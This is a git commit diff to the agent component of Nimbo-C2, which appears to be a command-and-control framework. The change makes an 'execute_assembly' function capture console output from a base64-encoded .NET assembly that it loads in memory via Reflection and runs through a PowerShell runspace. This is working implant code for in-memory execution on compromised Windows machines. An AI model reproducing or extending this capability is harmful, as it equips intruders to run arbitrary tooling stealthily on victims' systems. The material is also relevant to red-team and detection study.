5ead8b7b5c2a9a433c6e8e26d68f058e851d758a
Itay Migdal <itaymigdal9@gmail.com>
2022-10-25 21:22:18 +0300

    ASSEMBLY WORKINGGGG

--- Nimbo-C2/agent/utils/clr.nim
+++ Nimbo-C2/agent/utils/clr.nim
@@ -1,6 +1,5 @@
 import std/[strformat, strutils]
-import winim/[clr]
-import os
+import winim/[clr, lean]
 
 
 proc execute_encoded_powershell*(encoded_command: string): string =
@@ -34,13 +33,17 @@ proc execute_assembly*(assembly_b64: string, assembly_args: string): (bool, stri
     $assembly_bytes = [System.Convert]::FromBase64String($assembly_b64)
     $assembly = [Reflection.Assembly]::Load($assembly_bytes)
     $params = @(,[String[]]$assembly_args.Split(" "))
+    $Writer = [System.IO.StringWriter]::new()
+    $Writer.flush()
+    $OriginalOut = [System.Console]::Out
+    [System.Console]::SetOut($Writer)
     $assembly.EntryPoint.invoke($null, $params)
+    $Writer.GetStringBuilder().ToString()
     """)
     pipeline.Commands.Add("Out-String")
     var results = pipeline.Invoke()
     for i in countUp(0, results.Count()-1):
         output.add($results.Item(i))
     runspace.Close()
-
     return (is_success, output.replace("\c", ""))
 
